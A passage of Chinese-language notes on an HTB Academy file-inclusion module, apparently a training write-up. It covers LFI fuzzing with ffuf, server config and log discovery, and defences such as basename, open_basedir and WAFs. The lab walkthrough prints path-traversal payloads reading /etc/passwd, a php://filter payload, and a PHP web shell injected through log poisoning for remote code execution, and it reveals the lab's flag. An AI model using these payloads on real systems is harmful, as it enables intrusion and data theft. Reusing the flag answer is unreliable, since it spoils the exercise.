 :: Wordlist         : FUZZ: /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=<<<< [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

如你所见，扫描产生了许多可用于利用漏洞的 LFI payload。一旦我们识别出 payload，我们应该手动测试它们以验证它们按预期工作并显示包含的文件内容。

---

## 模糊测试服务器文件

除了模糊测试 LFI payload 之外，还有不同的服务器文件可能对我们的 LFI 利用有帮助，所以了解这些文件存在的位置以及我们是否可以读取它们会很有帮助。这些文件包括：`服务器 webroot 路径`、`服务器配置文件` 和 `服务器日志`。

#### 服务器 Webroot

在某些情况下，我们可能需要知道完整的服务器 webroot 路径才能完成利用。例如，如果我们想定位我们上传的文件，但我们无法通过相对路径（例如 `../../uploads`）到达其 `/uploads` 目录。在这种情况下，我们可能需要找出服务器 webroot 路径，以便我们可以通过绝对路径而不是相对路径定位我们上传的文件。

为此，我们可以通过常见的 webroot 路径对 `index.php` 文件进行模糊测试，我们可以在这个 [Linux 字典](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) 或这个 [Windows 字典](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) 中找到。根据我们的 LFI 情况，我们可能需要添加一些返回目录（例如 `../../../../`），然后在后面添加我们的 `index.php`。

以下是我们如何使用 ffuf 完成所有这些操作的示例：

  服务器 Webroot

```shell-session
tr01ax@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

如你所见，扫描确实识别出正确的 webroot 路径为 (`/var/www/html/`)。我们也可以使用我们之前使用的 [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) 字典，因为它也包含各种可能揭示 webroot 的 payload。如果这不能帮助我们识别 webroot，那么我们最好的选择是读取服务器配置，因为它们往往包含 webroot 和其他重要信息，正如我们接下来将看到的。

#### 服务器日志/配置

正如我们在上一节中看到的，我们需要能够识别正确的日志目录才能执行我们讨论的日志投毒攻击。此外，正如我们刚才讨论的，我们可能还需要读取服务器配置才能识别服务器 webroot 路径和其他重要信息（如日志路径！）。

为此，我们也可以使用 [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) 字典，因为它包含我们可能感兴趣的许多服务器日志和配置路径。如果我们想要更精确的扫描，我们可以使用这个 [Linux 字典](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) 或这个 [Windows 字典](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)，不过它们不是 `seclists` 的一部分，所以我们需要先下载它们。让我们针对我们的 LFI 漏洞尝试 Linux 字典，看看我们得到什么：

  服务器日志/配置

```shell-session
tr01ax@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

如你所见，扫描返回了 60 多个结果，其中许多结果使用 [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) 字典没有被识别出来，这表明在某些情况下精确扫描很重要。现在，我们可以尝试读取这些文件中的任何一个，看看是否可以获取它们的内容。我们将读取 (`/etc/apache2/apache2.conf`)，因为它是 Apache 服务器配置的已知路径：

  服务器日志/配置

```shell-session
tr01ax@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

如你所见，我们确实获得了默认的 webroot 路径和日志路径。但是，在这种情况下，日志路径使用的是一个全局 Apache 变量 (`APACHE_LOG_DIR`)，该变量位于我们上面看到的另一个文件中，即 (`/etc/apache2/envvars`)，我们可以读取它来找到变量值：

  服务器日志/配置

```shell-session
tr01ax@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

如你所见，(`APACHE_LOG_DIR`) 变量设置为 (`/var/log/apache2`)，之前的配置告诉我们日志文件是 `/access.log` 和 `/error.log`，我们在上一节中访问过它们。

**注意：** 当然，我们可以简单地使用字典来查找日志，因为我们在本节中使用的多个字典确实显示了日志位置。但这个练习向我们展示了如何手动浏览已识别的文件，然后使用我们找到的信息进一步识别更多文件和重要信息。这与我们在 `PHP 过滤器` 部分读取不同文件源时非常相似，这种努力可能会揭示以前未知的有关 Web 应用程序的信息，我们可以使用这些信息进一步利用它。

---

## LFI 工具

最后，我们可以利用许多 LFI 工具来自动化我们一直在学习的大部分过程，这在某些情况下可能会节省时间，但也可能会错过我们通过手动测试可能识别的许多漏洞和文件。最常见的 LFI 工具是 [LFISuite](https://github.com/D35m0nd142/LFISuite)、[LFiFreak](https://github.com/OsandaMalith/LFiFreak) 和 [liffy](https://github.com/mzfr/liffy)。我们也可以在 GitHub 上搜索各种其他 LFI 工具和脚本，但一般来说，大多数工具执行相同的任务，只是成功率和准确性水平不同。

不幸的是，这些工具大多数没有得到维护，并且依赖于过时的 `python2`，因此使用它们可能不是一个长期解决方案。尝试下载上述任何工具并在我们在本模块中使用的任何练习上测试它们，以查看它们的准确性水平。#lfi #rfi #hacking  [source](https://academy.hackthebox.com/module/23/section/622)

# 文件包含防护

本模块讨论了检测和利用文件包含漏洞的各种方法，以及我们可以利用的不同安全绕过和远程代码执行技术。有了通过渗透测试识别文件包含漏洞的理解，我们现在应该学习如何修补这些漏洞并加固我们的系统，以降低其发生的可能性并在发生时减少影响。

---

## 文件包含防护

我们可以做的最有效的事情来减少文件包含漏洞是避免将任何用户控制的输入传递给任何文件包含函数或 API。页面应该能够在后端动态加载资源，而无需任何用户交互。此外，在本模块的第一部分，我们讨论了可能用于在页面中包含其他文件的不同函数，并提到了每个函数具有的权限。每当使用这些函数中的任何一个时，我们应该确保没有用户输入直接进入它们。当然，这个函数列表并不全面，所以我们通常应该考虑任何可以读取文件的函数。

在某些情况下，这可能不可行，因为它可能需要更改现有 Web 应用程序的整个架构。在这种情况下，我们应该使用允许的用户输入的有限白名单，并将每个输入与要加载的文件匹配，同时为所有其他输入设置默认值。如果我们处理的是现有的 Web 应用程序，我们可以创建一个包含前端使用的所有现有路径的白名单，然后使用此列表来匹配用户输入。这样的白名单可以有多种形式，例如将 ID 匹配到文件的数据库表、将名称匹配到文件的 `case-match` 脚本，甚至是可以匹配的名称和文件的静态 JSON 映射。

一旦实现了这一点，用户输入就不会进入函数，而是使用匹配的文件，这样就避免了文件包含漏洞。
## Preventing Directory Traversal（防止目录遍历）

如果攻击者能够控制目录，他们就可以逃离 Web 应用程序并攻击他们更熟悉的内容，或者使用 `universal attack chain`（通用攻击链）。正如我们在整个模块中讨论的那样，目录遍历可能允许攻击者执行以下任何操作：

- 读取 `/etc/passwd` 并可能找到 SSH 密钥或获取有效的用户名用于密码喷洒攻击
- 发现服务器上的其他服务（如 Tomcat）并读取 `tomcat-users.xml` 文件
- 发现有效的 PHP Session Cookies（会话 Cookie）并执行会话劫持
- 读取当前 Web 应用程序的配置和源代码

防止目录遍历的最佳方法是使用编程语言（或框架）的内置工具仅提取文件名。例如，PHP 有 `basename()` 函数，它会读取路径并仅返回文件名部分。如果只给出文件名，它将只返回文件名。如果只给出路径，它会将最后一个 / 之后的内容视为文件名。这种方法的缺点是，如果应用程序需要进入任何目录，它将无法做到。

如果你创建自己的函数来实现此方法，可能会遗漏一些奇怪的边缘情况。例如，在 bash 终端中，进入你的主目录（cd ~）并运行命令 `cat .?/.*/.?/etc/passwd`。你会看到 Bash 允许使用 `?` 和 `*` 通配符作为 `.`。现在输入 `php -a` 进入 PHP 命令行解释器并运行 `echo file_get_contents('.?/.*/.?/etc/passwd');`。你会看到 PHP 对通配符没有相同的行为，如果将 `?` 和 `*` 替换为 `.`，命令将按预期工作。这表明我们上述函数存在边缘情况，如果我们让 PHP 使用 `system()` 函数执行 bash，攻击者将能够绕过我们的目录遍历防护。如果我们使用框架的原生函数，其他用户有机会在边缘情况被利用到我们的 Web 应用程序之前发现并修复它。

此外，我们可以对用户输入进行清理，递归删除任何目录遍历尝试，如下所示：

Code: php

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

如我们所见，这段代码递归删除 `../` 子字符串，因此即使结果字符串包含 `../`，它仍然会被删除，这将防止我们在本模块中尝试的一些绕过方法。

---

## Web Server Configuration（Web 服务器配置）

还可以使用多种配置来减少文件包含漏洞发生时的影响。例如，我们应该全局禁用远程文件包含。在 PHP 中，可以通过将 `allow_url_fopen` 和 `allow_url_include` 设置为 Off 来实现。

通常还可以将 Web 应用程序锁定在其 Web 根目录中，防止它们访问与 Web 无关的文件。当今最常见的方法是在 `Docker` 中运行应用程序。但是，如果这不是一个选项，许多语言通常有办法防止访问 Web 目录之外的文件。在 PHP 中，可以通过在 php.ini 文件中添加 `open_basedir = /var/www` 来实现。此外，你应该确保禁用某些可能危险的模块，如 [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) 和 [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html)。

如果应用了这些配置，应该能够防止访问 Web 应用程序文件夹之外的文件，因此即使识别出 LFI 漏洞，其影响也会降低。

---

## Web Application Firewall (WAF)（Web 应用程序防火墙）

加固应用程序的通用方法是使用 Web Application Firewall (WAF)（Web 应用程序防火墙），例如 `ModSecurity`。在处理 WAF 时，最重要的是避免误报和阻止非恶意请求。ModSecurity 通过提供 `permissive`（宽容）模式来最小化误报，该模式仅报告它本应阻止的内容。这让防御者可以调整规则以确保不会阻止合法请求。即使组织从不想将 WAF 转为"阻止模式"，仅在宽容模式下运行也可以作为应用程序正在受到攻击的早期预警信号。

最后，重要的是要记住，加固的目的是为应用程序提供更坚固的外壳，这样当攻击发生时，防御者有时间进行防御。根据 [FireEye M-Trends Report of 2020](https://content.fireeye.com/m-trends/rpt-m-trends-2020)，公司检测到黑客的平均时间为 30 天。通过适当的加固，攻击者会留下更多痕迹，组织有望更快地检测到这些事件。

重要的是要理解，加固的目标不是让你的系统无法被入侵，这意味着你不能忽视对加固系统的日志监控，因为它是"安全的"。加固系统应该持续测试，特别是在与你的系统相关的应用程序（例如：Apache Struts、RAILS、Django 等）发布零日漏洞后。在大多数情况下，零日漏洞会有效，但由于加固，它可能会生成独特的日志，这使得确认该漏洞是否被用于攻击系统成为可能。#lfi #hacking #walkthrough

# Labs - Skill Assessment（实验 - 技能评估）

Scenario[](https://nukercharlie.gitbook.io/htb-academy-cpts/external-web/file-inclusion/labs-skill-assessment#scenario)

公司 `INLANEFREIGHT` 已聘请你对其面向公众的网站之一进行 Web 应用程序评估。他们过去经历过许多评估，但匆忙添加了一些新功能，特别担心文件包含/路径遍历漏洞。

他们提供了目标 IP 地址，没有关于其网站的更多信息。对 Web 应用程序执行全面评估，检查文件包含和路径遍历漏洞。

在文件系统的 / 根目录中找到一个 flag。提交 flag 的内容作为你的答案。

Answers[](https://nukercharlie.gitbook.io/htb-academy-cpts/external-web/file-inclusion/labs-skill-assessment#answers)

在浏览网站时发现了参数 'page'，并通过使用以下方法，通过拦截来自 'contact' 页面的请求发现了参数 'message'。手动对两个参数进行 LFI 漏洞模糊测试没有结果：

┌──(kali㉿kali)-[~]

└─$ ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://IP:PORT:30157/FUZZ.php

<SNIP>

index [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 151ms]

about [Status: 200, Size: 10313, Words: 2398, Lines: 214, Duration: 198ms]

contact [Status: 200, Size: 2714, Words: 773, Lines: 78, Duration: 198ms]

main [Status: 200, Size: 11507, Words: 2639, Lines: 284, Duration: 139ms]

industries [Status: 200, Size: 8082, Words: 2018, Lines: 197, Duration: 101ms]

error [Status: 200, Size: 199, Words: 41, Lines: 10, Duration: 96ms]

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://IP:PORT/index.php?FUZZ=value' -fs 15829

page [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 106ms]

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://IP:PORT/index.php?page=FUZZ' -fs 4521,4322

​

┌──(kali㉿kali)-[~]

└─$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://IP:PORT/index.php?message=FUZZ' -fs 15829

使用工具发现 LFI 漏洞：

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/index.php?page=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

[+] LFI -> 'http://IP:PORT/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex'

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 61

Vulnerabilities found: 1

​

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/index.php?message=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 63

Vulnerabilities found: 0

使用该漏洞找到隐藏页面：

┌──(kali㉿kali)-[~]

└─$ curl http://IP:PORT/index.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex

​

解码 base64 值后发现：

<a href="ilf_admin/index.php">Admin</a>

导航到 `http://IP:PORT/ilf_admin/index.php` 并发现带有日志的管理面板。同样在 'log' 参数上寻找 LFI 漏洞：

┌──(kali㉿kali)-[~]

└─$ python lfimap.py -U 'http://IP:PORT/ilf_admin/index.php?log=PWN'

[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.

[+] LFI -> 'http://142.93.40.191:31420/ilf_admin/index.php?log=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'

----------------------------------------

Lfimap finished with execution.

Endpoints tested: 1

Requests sent: 35

Vulnerabilities found: 1

使用 LFI 漏洞找到服务器日志 `/var/log/nginx/access.log`、`/var/log/nginx/error.log`（有关可能被污染的日志的更多详细信息，请参阅笔记中的 Server Log Poisoning 部分，或如下所示对文件进行模糊测试）。

┌──(kali㉿kali)-[~]

└─$ ffuf -ic -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-WordList-Linux:FUZZ -u http://IP:PORT/ilf_admin/index.php?log=../../../../../FUZZ -fs 2046

<SNIP>

/etc/ca-certificates.conf [Status: 200, Size: 7659, Words: 163, Lines: 242, Duration: 137ms]

/etc/fstab [Status: 200, Size: 2135, Words: 154, Lines: 104, Duration: 125ms]

/etc/group- [Status: 200, Size: 2761, Words: 150, Lines: 151, Duration: 124ms]

/etc/group [Status: 200, Size: 2766, Words: 150, Lines: 151, Duration: 145ms]

/etc/hosts [Status: 200, Size: 2280, Words: 155, Lines: 110, Duration: 134ms]

/etc/hostname [Status: 200, Size: 2084, Words: 150, Lines: 103, Duration: 135ms]

/etc/inittab [Status: 200, Size: 2616, Words: 196, Lines: 125, Duration: 143ms]

/etc/issue [Status: 200, Size: 2100, Words: 159, Lines: 105, Duration: 111ms]

/etc/modules [Status: 200, Size: 2061, Words: 150, Lines: 104, Duration: 100ms]

/etc/motd [Status: 200, Size: 2329, Words: 183, Lines: 112, Duration: 118ms]

/etc/mtab [Status: 200, Size: 5331, Words: 325, Lines: 137, Duration: 118ms]

/etc/nginx/nginx.conf [Status: 200, Size: 4965, Words: 934, Lines: 196, Duration: 107ms]

/etc/os-release [Status: 200, Size: 2210, Words: 153, Lines: 108, Duration: 104ms]

/etc/passwd- [Status: 200, Size: 3218, Words: 152, Lines: 129, Duration: 105ms]

/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 106ms]

/etc/profile [Status: 200, Size: 2284, Words: 199, Lines: 112, Duration: 102ms]

/etc/resolv.conf [Status: 200, Size: 2152, Words: 155, Lines: 105, Duration: 102ms]

/etc/sysctl.conf [Status: 200, Size: 2099, Words: 157, Lines: 103, Duration: 104ms]

/proc/devices [Status: 200, Size: 2488, Words: 226, Lines: 150, Duration: 100ms]

/proc/cpuinfo [Status: 200, Size: 7518, Words: 826, Lines: 214, Duration: 100ms]

/proc/meminfo [Status: 200, Size: 3465, Words: 619, Lines: 153, Duration: 103ms]

/proc/self/cmdline [Status: 200, Size: 2064, Words: 152, Lines: 102, Duration: 103ms]

/proc/net/udp [Status: 200, Size: 2174, Words: 185, Lines: 103, Duration: 103ms]

/proc/net/tcp [Status: 200, Size: 64596, Words: 24715, Lines: 519, Duration: 105ms]

/proc/self/environ [Status: 200, Size: 61088, Words: 151, Lines: 102, Duration: 106ms]

/proc/self/mounts [Status: 200, Size: 5331, Words: 325, Lines: 137, Duration: 104ms]

/proc/self/stat [Status: 200, Size: 2357, Words: 201, Lines: 103, Duration: 101ms]

/proc/self/status [Status: 200, Size: 3393, Words: 242, Lines: 158, Duration: 102ms]

/proc/version [Status: 200, Size: 2235, Words: 169, Lines: 103, Duration: 105ms]

/var/log/nginx/access.log [Status: 200, Size: 812946, Words: 69256, Lines: 3941, Duration: 115ms]

/var/log/nginx/error.log [Status: 200, Size: 2711822, Words: 223611, Lines: 3726, Duration: 130ms]

使用 Burp Suite 拦截对网站的请求，并使用基本 PHP web shell（网页后门）修改它：

GET / HTTP/1.1

Host: IP:PORT

Upgrade-Insecure-Requests: 1

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

​

OR

​

GET /<?php system($_GET['cmd']); ?> HTTP/1.1

Host: 138.68.155.111:32334

Upgrade-Insecure-Requests: 1

User-Agent: HACKED

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

然后通过查看访问日志获得 RCE（远程代码执行）：

http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /etc/passwd

http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls -la /

<SNIP>

drwxr-xr-x 1 root root 4096 Mar 14 02:24 .

drwxr-xr-x 1 root root 4096 Mar 14 02:24 ..

drwxr-xr-x 2 root root 4096 May 29 2020 bin

drwxr-xr-x 5 root root 360 Mar 14 02:24 dev

drwxr-xr-x 1 root root 4096 Mar 14 02:24 etc

-rw-r--r-- 1 root root 33 Sep 9 2020 flag_dacc60f2348d.txt

drwxr-xr-x 2 root root 4096 May 29 2020 home

drwxr-xr-x 1 root root 4096 Sep 9 2020 lib

drwxr-xr-x 5 root root 4096 May 29 2020 media

drwxr-xr-x 2 root root 4096 May 29 2020 mnt

drwxr-xr-x 2 root root 4096 May 29 2020 opt

dr-xr-xr-x 438 root root 0 Mar 14 02:24 proc

drwx------ 2 root root 4096 May 29 2020 root

drwxr-xr-x 1 nobody nobody 4096 Mar 14 02:24 run

drwxr-xr-x 2 root root 4096 May 29 2020 sbin

drwxr-xr-x 2 root root 4096 May 29 2020 srv

dr-xr-xr-x 13 root root 0 Mar 14 02:24 sys

drwxrwxrwt 1 root root 4096 Mar 14 02:24 tmp

drwxr-xr-x 1 root root 4096 Sep 9 2020 usr

drwxr-xr-x 1 root root 4096 Sep 9 2020 var

​

http://IP:PORT/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat /flag_dacc60f2348d.txt

a9a892dbc9faf9a014f58e007721835e
